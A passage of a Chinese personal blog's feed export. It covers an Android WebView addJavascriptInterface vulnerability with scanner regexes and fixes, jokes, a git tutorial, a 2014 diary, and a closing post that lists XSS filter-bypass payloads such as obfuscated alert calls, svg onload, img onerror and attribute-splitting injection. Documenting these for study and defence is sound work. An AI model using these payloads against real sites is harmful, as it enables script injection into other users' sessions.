class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&#160; &#160; &#160; &#160;测试结果<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-2.png" alt=""></p>
<p>&#160; &#160; &#160; &#160;可以看到，即便test类没有具体实现代码，也一样会触发漏洞。<br><br></p>
<p>###漏洞检测<br>&#160; &#160; &#160; &#160;通过编写静态扫描器过滤出可能存在问题的apk，方法是通过apktool将apk文件反编译成smali,之后进行暴力搜索关键字。<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-3.png" alt=""><br><br><br>其中用到的几个关键的正则:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取类名</span><br><span class="line"><span class="string">r"^\.class.+(Lcom.+);"</span></span><br><span class="line">获取所有method</span><br><span class="line"><span class="string">r"(\.method[\s\S]*?\.end *method)"</span></span><br><span class="line">获取method方法类型</span><br><span class="line"><span class="string">r"^\.method.+ +(\w+) *\("</span></span><br><span class="line">获取method中的.line</span><br><span class="line"><span class="string">r"\.line([\s\S]*?)(?=(\.line))"</span></span><br><span class="line">获取指定的调用函数</span><br><span class="line"><span class="string">r"setJavaScriptEnabled|addJavascriptInterface"</span></span><br></pre></td></tr></table></figure></p>
<p>###防范</p>
<ul>
<li>使用removeJavascriptInterface(“searchBoxJavaBridge<em>“)移除searchBoxJavaBridge</em>对象<br>1.重构WebView控件(WebViewEx)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.idhyt.webview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * Created by idhyt on 2015/4/28.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebViewEx</span> <span class="keyword">extends</span> <span class="title">WebView</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebViewEx</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">10</span> &amp;&amp; Build.VERSION.SDK_INT &lt; <span class="number">17</span>) &#123;</span><br><span class="line">            removeJavascriptInterface(<span class="string">"searchBoxJavaBridge_"</span>);</span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibility");</span></span><br><span class="line">            <span class="comment">// removeJavascriptInterface("accessibilityTraversal");</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.修改系统解析XML中定义的属性回调方法(layout\activity_main.xml中<webview>)</webview></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">com.example.idhyt.webview.WebViewEx</span></span><br><span class="line">    <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">    <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.调用WebViewEx控件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    WebViewEx webview = (WebViewEx)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>确保只在访问可信页面数据时才使用addjavascriptInterface。 </li>
<li>在调用Java对象方法前对参数进行检查，避免执行恶意操作。</li>
<li>对于在4.2(API 17+)系统运行的应用，使用JavascriptInterface代替addjavascriptInterface。</li>
<li>限制对于该接口的使用来源，只允许可信来源访问该接口。例如使用WebViewClient中的shouldOverrideUrlLoading()来对加载的URL进行检查。</li>
</ul>
<p>###参考</p>
<ol>
<li><a href="http://50.56.33.56/blog/?p=314" target="_blank" rel="external">Abusing WebView JavaScript Bridges</a></li>
<li><a href="http://drops.wooyun.org/papers/548" target="_blank" rel="external">WebView中接口隐患与手机挂马利用</a></li>
<li><a href="http://blog.csdn.net/leehong2005/article/details/11808557" target="_blank" rel="external">Android WebView的Js对象注入漏洞解决方案</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。<br>]]>
    
    </summary>
    
      <category term="webview" scheme="http://blog.idhyt.xyz/tags/webview/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[无法描述]]></title>
    <link href="http://blog.idhyt.xyz/2015/03/23/1-essay-record/"/>
    <id>http://blog.idhyt.xyz/2015/03/23/1-essay-record/</id>
    <published>2015-03-23T13:46:33.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我<a id="more"></a><br>那最不美的呢<br>它特么的竟然在骗我 :)</p>
</li>
<li><p>其实我内心是一个没有太多梦想的人，有点懒，爱玩，定力不足，喜欢靠点小聪明安于现状，侥幸能走到现在我已很意外。不喜欢有压力，不习惯别人对我报太大期望，让人失望，那种感觉很不好，是不是我们心里都有一种拿人钱财替人消灾的愧疚感。。</p>
</li>
<li><p>这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。</p>
</li>
<li><p>圈养的羡慕放养的自由，放养的羡慕圈养的安稳。有想法一定要去尝试，不要让想法成为空谈的资本。把尝试当成任务，而不是间歇的测试，不要让尝试成为拖延的借口。回头看看之前发的状态，经常温习一下过去的安逸的日子，你会发现。我都不明白我在讲什么了。总之，还很菜。</p>
</li>
<li><p>世界上有完美的人和事吗？只展现好的一面就一定是好人吗？因为假，所以看起来很完美；因为真，所以看起来才不那么完美。很简单的道理，可是很多人却不懂。宁愿相信假的美好，也不敢面对不完美的真实。</p>
</li>
<li><p>我们总认为大脑是人体最聪明的器官，但是你再想想，这个判断是大脑自己做出的。</p>
</li>
<li><p>有种现象叫“薛定谔的滚”，即当一个妹子叫你滚的时候，你永远不知道她是在叫你滚还是叫你过来抱紧。 此时的你应该处于一种又抱又滚的量子力学状态，解出该波函数以得知在平行世界你被踹翻还是被抱紧的概率多少关键是：看脸。</p>
</li>
<li><p>人生若只如初见，何事秋风悲画扇？等闲变却故人心，却道故人心易变。</p>
</li>
<li><p>世界上最遥远的距离，是我在if里你在else里，似乎一直相伴又永远分离；世界上最痴心的等待，是我当case你是switch，或许永远都选不上自己；世界上最真情的相依，是你在try我在catch，无论你发神马脾气，我都默默承受，静静处理，到那时，再来期待我们的finally，或者，崩溃退出</p>
</li>
<li><p>早安，生活中遇到傻逼怎么办？支持他一切，把他培养成大傻逼</p>
</li>
<li><p>所谓生活的滋味不一定是在你住在高级酒店的一刻，也不一定都是你一览众山小时的感慨，而是我们乏味似水的时时刻刻</p>
</li>
<li><p>你们用盗版的时候有想过做出这款软件的程序员吗？！他们该如何养家糊口？哈哈哈，别逗了，程序员哪有家要养啊！</p>
</li>
<li><p>我个子矮怎么了，我捡钱速度比你快</p>
</li>
<li><p>我喜欢你 别说你做过鸭 就算你杀人了 我也是会帮你藏尸的那个人</p>
</li>
<li><p>人都他妈是一边傻一边成长，真的</p>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我]]>
    
    </summary>
    
      <category term="joke" scheme="http://blog.idhyt.xyz/tags/joke/"/>
    
      <category term="无法描述" scheme="http://blog.idhyt.xyz/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git使用总结]]></title>
    <link href="http://blog.idhyt.xyz/2015/01/16/2-git-conclusion/"/>
    <id>http://blog.idhyt.xyz/2015/01/16/2-git-conclusion/</id>
    <published>2015-01-16T13:46:33.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>windows下git使用总结<a id="more"></a></p>
<h3 id="初始化配置Github">初始化配置Github</h3><ol>
<li><p>下载msysgit并安装 : <a href="http://msysgit.github.io/" target="_blank" rel="external">http://msysgit.github.io/</a></p>
</li>
<li><p>github上创建一个项目，如SmartScript</p>
</li>
<li><p>初始化<br> 新建Github目录并进入：cd d:\work\Github<br> git init<br> git config –global user.name “usernme” （username：GitHub的用户名）<br> git config –global user.email  “emailName” （emailName：GitHub的注册邮箱）</p>
</li>
<li><p>安装ssh<br> 4.1 检查SSH公钥 : cd ~/.ssh 看看存不存在.ssh</p>
<p> 4.2 生成SSH公钥 : ssh-keygen -t rsa -C “your_email@youremail.com”</p>
<pre><code><span class="comment"># Creates a new ssh key using the provided email Generating public/private rsa key pair.</span>
Enter <span class="built_in">file</span> <span class="operator">in</span> which <span class="built_in">to</span> save <span class="operator">the</span> key (/user/you/.ssh/id_rsa):
</code></pre><p> 现在你可以看到，在自己的目录下，有一个.ssh目录，说明成功了</p>
<p> 4.3 输入github密码</p>
<pre><code>Enter passphrase (<span class="keyword">empty</span> <span class="keyword">for</span> no passphrase): [<span class="keyword">Type</span> a passphrase]
Enter same passphrase again: [<span class="keyword">Type</span> passphrase again]
这个时候输入你在github密码。
然后在.ssh中可以看到
Your identification <span class="keyword">has</span> been saved <span class="keyword">in</span> /home/you/.ssh/id_rsa.
# Your <span class="keyword">public</span> key <span class="keyword">has</span> been saved <span class="keyword">in</span> /home/you/.ssh/id_rsa.pub.
</code></pre><p> 4.4 添加SSH公钥到github</p>
<pre><code>打开<span class="tag">github</span>，找到账户里面添加<span class="tag">SSH</span>，把<span class="tag">idrsa</span><span class="class">.pub</span>内容复制到<span class="tag">key</span>里面。
</code></pre><p> 4.5 测试是否生效</p>
<pre><code>使用命令： ssh -T git@github.com
当你看到这些内容放入时候，直接yes
The authenticity of host 'github.com (207.97.227.239)' can't be established.
RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
Are you sure you want to continue connecting (yes/no)?
看到这个内容放入时候，说明就成功了。
![<span class="link_label">tool-editor</span>](<span class="link_url">http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-1.png</span>)
</code></pre></li>
<li><p>使用git add filename 将项目文件添加到库（如 git add “readme.txt”）<br> 也可以多文件夹设置，如在Github目录下创建文件夹Python并拷贝项目到该目录，然后CD 进入执行命令</p>
</li>
<li><p>使用git commit -m “first commit” 进行提交（”first commit” 相当于一个描述）</p>
</li>
<li><p>使用远程连接：git remote add origin git@github.com:username/SmartScript.git （username：GitHub上的用户名，SmartScript：我在GitHub上创建的仓库repository名）</p>
</li>
<li><p>输入命令“git push origin master”将源码推送到GitHub</p>
</li>
<li><p>在GitHub上仓库页面刷新即可看到你在本地创建并提交的文件</p>
</li>
</ol>
<h3 id="删除Github上的文件(如_del-txt)">删除Github上的文件(如 del.txt)</h3><ol>
<li>进入到对应的目录下 cd: D:\work\Github\SmartScript</li>
<li>git rm –cached ”del.txt”</li>
<li>git commit -m “del”</li>
<li>git push origin master (失败先 git pull)<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-2.png" alt="tool-editor"></li>
<li>另外<br> 使用 git rm 命令即可，有两种选择,<br> 一种是 git rm –cached “文件路径”，不删除物理文件，仅将该文件从缓存中删除；<br> 一种是 git rm –f “文件路径”，不仅将该文件从缓存中删除，还会将物理文件删除（不会回收到垃圾桶）。<br> 如果删除文件夹，需要加-r参数<br> 如： git rm –f -r “文件夹名”</li>
</ol>
<h3 id="克隆一个项目下来">克隆一个项目下来</h3><p>git clone git@github.com:username/Hello.git（username：GitHub上的用户名，SmartScript：我在GitHub上创建的仓库repository名）</p>
<h3 id="忽略文件-gitignore">忽略文件.gitignore</h3><ol>
<li>进入要忽略的目录创建文件<br> touch  .gitignore     #创建gitignore隱藏文件</li>
<li>vim .gitignore     #编辑文件，加入指定文件 </li>
<li>git add . #就可以自动忽略掉指定的文件</li>
<li>文件.gitignore的格式规范：<br>A：#为注释<br>B：可以使用shell所使用的正则表达式来进行模式匹配<br>C：匹配模式最后跟”/“说明要忽略的是目录<br>D：使用！取反（例如目录中包含  test.a，并且gitignore文件中包含  <em>.[oa]，如果在文件中加入 ！test.a   表明忽略除test.a文件以外的后缀名为.a或者.o的文件）<br>tmp.txt         //忽略tmp.txt
</em>.log           //忽略所有log文件<br>tmp/<em>           //忽略tmp文件夹所有文件<br>log/**/</em>.log    //忽略log目录下的包括子目录下的所有log文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#19979;&#38754;&#26159;&#25105;&#30340;gitignore&#25991;&#20214;&#30340;&#20869;&#23481; &#10;#&#24573;&#30053;gitignore&#25991;&#20214; &#10;.gitignore&#10;#&#24573;&#30053;&#21518;&#32512;&#21517;&#20026;.o&#21644;.a&#30340;&#25991;&#20214; &#10;*.[oa]&#10;#&#24573;&#30053;&#21518;&#32512;&#21517;&#20026;.exe&#21644;.txt&#30340;&#25991;&#20214; &#10;*.exe&#10;*.txt&#10;#&#26174;&#31034;&#25351;&#23450;&#24573;&#30053;&#21517;&#31216;&#20026;main&#30340;&#25991;&#20214; &#10;main&#10;&#10;# eg:c++ .gitignore&#10;*.sdf&#10;.gitignore&#10;Debug/*&#10;Release/*&#10;ipch/*</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="更新远程仓库代码到本地">更新远程仓库代码到本地</h3><ol>
<li>查看远程仓库<br> git remote -v</li>
<li>从远程获取最新版本到本地<br> git fetch origin master</li>
<li>比较本地的仓库和远程参考的区别 （作参考，可不用执行该步）<br> git log -p master..  origin/master</li>
<li>远程代码下载下来合并到本地仓库<br> git merge origin/master</li>
<li>git add –p (patch模式)<br> eg: 修改了a,b,c文件<br> git add -p    //列出所有更改<br> y/a 应用<br> git commit -m “..”<br> …</li>
</ol>
<h3 id="关于可能出现的错误">关于可能出现的错误</h3><ol>
<li><p>在执行<br> $ git remote addorigin git@github.com:defnngj/hello-world.git<br> 错误提示：fatal: remote origin already exists.<br> 解决办法：<br> $ git remote rm origin<br> 然后在执行：$ git remote add origin git@github.com:defnngj/hello-world.git 就不会报错误了</p>
</li>
<li><p>在执行<br> $ git push origin master<br> 错误提示：error:failed to push som refs to…….<br> 解决办法：<br> $ git pull origin master // 先把远程服务器github上面的文件拉下来，再push 上去。</p>
</li>
<li><p>遇到的问题:<br> update were rejected because the tip of your current branch is behind ….<br> 原因是远程的的代码库比我本地的代码库要新。<br> 所以需要在远程代码库pull一次下来。<br> 再修改代码。再push。</p>
</li>
<li><p>遇到遇到的问题:<br> change not staged for commit 通过add 和 checkout解决不了<br> git rm –cached <file> (git rm –cached test)<br> git add file (git add test/)</file></p>
</li>
</ol>
<h3 id="git命令速查表">git命令速查表</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-4.png" alt="tool-editor"></p>
<h3 id="git详细命令表">git详细命令表</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-5.png" alt="tool-editor"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>windows下git使用总结]]>
    
    </summary>
    
      <category term="git" scheme="http://blog.idhyt.xyz/tags/git/"/>
    
      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我逝去的2014]]></title>
    <link href="http://blog.idhyt.xyz/2015/01/02/1-annual-summary-2014/"/>
    <id>http://blog.idhyt.xyz/2015/01/02/1-annual-summary-2014/</id>
    <published>2015-01-01T19:51:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。），另一种是身边还有一种单身的人一起热闹，第一种是个人问题，好吧，我个人有问题，第二种吧到了这种年纪，都是在晒孩子的，出了校门哪还有这群闲人啊，想想也是醉了。自己呆着打打游戏吧，总觉得有点可惜，出去看看吧，看的是别人在热闹，一个字，冷暖自知（威虎山还不错）。<br><a id="more"></a></p>
<hr>

<p>&#160; &#160; &#160; &#160;另起一行竟然打了个\n。。开始记事件，此刻应该来点音乐。。好，开始。从去年总结开始，过年回家在家呆了一个月，该玩的也玩了，该见的朋友也见了，好像该说的话也说了一点，不过没什么用，很多事情不是你努力就可以改变的，何况我也没有努力过。之后回学校，跟小伙伴们去了趟四姑娘山，想在回想起来还很清晰，当时是感冒加上高原反映加上精神有点亢奋是玩嗨了，这个写下来还是有点多，我还是去看看大神最后剪辑的视频回味一番就好了。看的好伤感啊，正如我毕业论文最后写的，光阴荏苒，岁月如歌，感谢走私团伙的每一位小伙伴，是你们让我拥有一个无比美好的研究生生活，你们的幽默诙谐，令我深深的难忘，你们的一颦一笑，都历历在目，能在这样一个环境中度过，是我极大的荣幸，太官方了哈哈，不过想想校园时光真的是无比美好呐。四姑娘山回来就是各种晃悠日子，每天写点论文，出去吃个饭，看个电影，周末还打个球啥的，那时候经常会想，哎呀，这一天一天没感觉啊，毕业了一定会很想念现在的日子吧，要珍惜每一天的生活，但是总是在拥有的时候，只是想着去珍惜，但却不知道如何去珍惜，就这么悄悄的失去了。离毕业就三个月了，好好珍惜，吃过饭上去打一把人机啊！离毕业就两个月了，好好珍惜，吃过饭打匹配啊！撸一把，撸一把写论文！撸一把刚好去吃饭！又被虐了，不开心！不开心了撸一把！离毕业就一个月了，好好珍惜，卧槽，要答辩了，论文写不完了！不撸了，写论文！好吧，撸一把真的写论文了！重复率xx%，毕不了业了！戒撸了！xx要去查重了，一群人围上去跟看小视频一样！现在想想脑子里都是8楼工作室各种回荡的声音，也是满满的回忆。最后大家都顺利毕业了，照了毕业照，吃了散伙饭，我也如愿的去了云南，虽然过程也是一波三折，虽然有点遗憾没能和黑豆女神在云南会和，但最后也是去了，也留下了奇思妙想的回忆，或许这比那些更加特别呢，是吧哈哈。。有机会还是要再去一趟云南，泸沽湖住个十天半个月的，如果有机会的话。</p>
<hr>

<p>&#160; &#160; &#160; &#160;至此，真的是又一次毕业了，青春又一次散场，虽然不能算是青春了，但是希望大家都永远年轻，永远热泪盈眶，永远心怀梦想，虽然我没什么梦想(感觉又再自黑)。之后回家在家呆了一周，去郑州见了朋友，来到了珠海，开始正式入职工作，感觉没有什么可以回忆的东西了，上班，吃饭，下班，睡觉。这种有规律的生活和学校无规律的生活最大的差别是什么，就是你去回忆学校的事情，你能想到很多很多，甚至很多小的细节，毕业从抽屉里扒出三年所有的发票电影票之类的东西，看着很多都能回想起来当时做了什么，跟谁，在哪里。而工作后的事情，回想半年的，好像没什么东西，就是工作，就好比每周去写周报，卧槽，这周我到底做了什么，每天都很忙，但是好像每天也没忙什么。这种感觉很奇妙，就好比心电图，之前你每天都是在上下波动的，你可以看到他在活跃，在生活，你想不到下一刻会有什么事情发生，是惊喜还是惊吓，忽然就平静下来，不在上下波动而变成一条缓慢向前的直线，虽然你看不到尽头，但是你能想到下一刻大概的轮廓，你没有了期待，没有思考的触点，甚至连梦想这种东西都没有去认真想过。</p>
<hr>

<p>&#160; &#160; &#160; &#160;我这种人平时也那么蒙蒙的，也不怎么知道主动联系人，发状态也是不正经的带着一些段子的味道，也只有在这安静的夜晚，静下心来才会想一些东西，不是不愿静，只是不想静，这种年纪不适合太伤感。就像毕业走的时候，本来就一个人送我，最后竟然辣么多人，我当时其实挺伤感的，因为我知道，一转身，一张张脸以后可能就再也见不到了，当时是多想拥抱一下，可惜下不去那手。最后我发现你们走的时候头都没回，我还想着你们一步三回头的看我几眼，你们竟然慌慌张张的赶着时间去吃自助餐！火车上收到你们的短信，真的是很不舍，要是不用工作该多好。</p>
<hr>

<p>&#160; &#160; &#160; &#160;写着写着还真是思绪乱飞有点伤感了，就此打住。今年就算过去了，刚毕业半年，去年一起来实习的小伙伴走了好几个，有的创业，有的跳槽，还有的纯粹是因为在公司得不到自己想要的而辞职，我只能羡慕他们，有梦想有心志，年轻有机会失败。我总会跟别人说工作可以就别读研浪费三年时间，其实对我来说帮助还是挺大的，因为我大学读的太渣了导致毕业找工作都是问题，有时想想如果没读研或许现在我都成家了吧，孩子可能都有了吧，不过可能混的比现在更差。人生没有重来，总会想着如果再来一次我会怎样怎样，其实如果再来一次，大部分人估计还是这样子吧。朋友说我淡薄，我觉得有点太高看我了，我不是淡薄，我只是能把我得不到的东西看淡，能为自己活的轻松找的借口而已，周围诱惑太多，真的能做到不被功名利禄诱惑的，我从内心相信这样的人是不存在的，而且在这之前，你得有被诱惑的资本，很明显，我没有。</p>
<hr>

<p>&#160; &#160; &#160; &#160;不知道如何结尾，就破天荒的给自己定个目标吧，算是给慢慢变老的心态打打鸡血，2015年，在技术上边某一方面要有突破，年中，知道自己想要什么，年底，确定何去何从。每年写年终总结写到最后的时候都在想，真快啊，明年这个时候会在哪里，身边会不会有个女朋友，然后每年都这么想下去了，按照此规律今年应该想着明年这个时候肯定没有女朋友。。又来。。。。真亦假假亦真，那就当她是个段子吧。</p>
<p>&#160; &#160; &#160; &#160;See you next year! </p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。），另一种是身边还有一种单身的人一起热闹，第一种是个人问题，好吧，我个人有问题，第二种吧到了这种年纪，都是在晒孩子的，出了校门哪还有这群闲人啊，想想也是醉了。自己呆着打打游戏吧，总觉得有点可惜，出去看看吧，看的是别人在热闹，一个字，冷暖自知（威虎山还不错）。<br>]]>
    
    </summary>
    
      <category term="diary" scheme="http://blog.idhyt.xyz/tags/diary/"/>
    
      <category term="无法描述" scheme="http://blog.idhyt.xyz/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[xss bypass]]></title>
    <link href="http://blog.idhyt.xyz/2014/10/15/2-xss-bypass/"/>
    <id>http://blog.idhyt.xyz/2014/10/15/2-xss-bypass/</id>
    <published>2014-10-15T03:56:24.000Z</published>
    <updated>2015-12-27T08:56:19.000Z</updated>
    <content type="html"><![CDATA[<p>xss绕过技巧整理<a id="more"></a></p>
<h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
